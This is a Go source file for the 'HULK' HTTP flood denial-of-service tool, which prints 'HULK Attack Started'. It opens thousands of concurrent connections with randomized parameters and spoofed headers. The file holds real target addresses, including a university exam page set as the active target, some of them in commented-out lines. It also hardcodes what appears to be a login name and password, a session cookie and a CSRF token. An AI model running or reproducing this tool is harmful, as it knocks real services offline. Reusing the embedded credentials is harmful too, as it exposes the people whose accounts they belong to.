package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__ = "1.0.1"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		//"http://www.google.ru/?hl=ru&q=",
		//"http://yandex.ru/yandsearch?text=",
	}
	headersUseragents []string = []string{
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	// flag.StringVar(&site, "site", "http://map.uz.taxi:8080/reverse?format=jsonv2&lat=41.28407468291545&lon=69.26207811157667&addressdetails=1&accept-language=en", "Destination site.")
	// flag.StringVar(&site, "site", "http://213.230.120.147", "Destination site.")
	// flag.StringVar(&site, "site", "https://87.237.238.27:8089/driver_candidate_api/v1/settings", "Destination site.")
	// flag.StringVar(&site, "site", "https://217.30.171.176:3443/api/driver-app/1.0/dict/countries", "Destination site.")

	// skat city
	// flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/?username=2305&password=GBRHBTYH&lang=en", "Destination site.")
	// flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/prefetch", "Destination site.")
	// flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/profile", "Destination site.")
	// flag.StringVar(&site, "site", "http://213.230.120.147", "Destination site.")

	//arzoni bizda
	// flag.StringVar(&site, "site", "https://213.230.124.250:8089/driver_candidate_api/v1/settings", "Destination site.")

	//hemis adu
	flag.StringVar(&site, "site", "https://student.adu.uz/test/exams?semester=14&_pjax=%23test-grid&_pjax=%23test-grid", "Destination site.")

	// biznes
	// flag.StringVar(&site, "site", "https://62.209.144.97:8090/driver_candidate_api/v1/settings", "Destination site.")

	// flag.StringVar(&site, "site", "https://ru.dsr-corporation.com", "Destination site.")
	// flag.StringVar(&site, "site", "https://student.adu.uz", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("HULKMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 5000
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("Hulk", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	// go func() {
	// 	fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
	// 	ss := make(chan uint8, 8)
	// 	var (
	// 		err, sent int32
	// 	)
	// 	fmt.Println("In use               |\tResp OK |\tGot err")
	// 	for {
	// 		if atomic.LoadInt32(&cur) < int32(maxproc-1) {
	// 			go httpcall(site, u.Host, data, headers, ss)
	// 		}
	// 		if sent%10 == 0 {
	// 			fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
	// 		}
	// 		switch <-ss {
	// 		case callExitOnErr:
	// 			atomic.AddInt32(&cur, -1)
	// 			err++
	// 		case callExitOnTooManyFiles:
	// 			atomic.AddInt32(&cur, -1)
	// 			maxproc--
	// 		case callGotOk:
	// 			sent++
	// 		case targetComplete:
	// 			sent++
	// 			fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
	// 			fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
	// 			os.Exit(0)
	// 		}
	// 	}
	// }()
	go func() {
		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				// maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	var param_joiner string
	var client = new(http.Client)

	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for {
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
			// q, err = http.NewRequest("GET", url+param_joiner+"username="+buildblock(rand.Intn(7)+3)+"password="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)
		q.Header.Set("X-CSRF-Token", "fju31d-3p4iD_FAOk9ecY6K9SqaKX3wREdF5r2LBCLgMY_-Btf2f2vfIYGLZjakJ6c8unroTO35flBXtOuxL9A==")
		q.Header.Set("Cookie", "_ga=GA1.1.1371172649.1645511335; week=0fc595e1389827a925f24d27ecd1781212dbe7705be86e7df85363953a21a009a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22week%22%3Bi%3A1%3Bs%3A5%3A%2276256%22%3B%7D; _ga_31T1HFVMCX=GS1.1.1646916759.5.0.1646916759.0; frontend=90gb0pci9m6k9n5bgndraifdfv; _frontendUser=28265cc7bdc04fe769905cdb11d5835f2350047cef4702fb31cb443894ecbac4a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_frontendUser%22%3Bi%3A1%3Bs%3A48%3A%22%5B%223744%22%2C%22vn-iY_LVeK0nilycrHARhSchEqKp1irL%22%2C3600%5D%22%3B%7D; _csrf-frontend=9a0c5f2c95adb72ef35cd0895a012bc869442e337b1c3787e544f8c986accaa3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22rXHTjJ8Rt40lJZ5jKrd80LGoNElBX-CL%22%3B%7D")

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 500 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
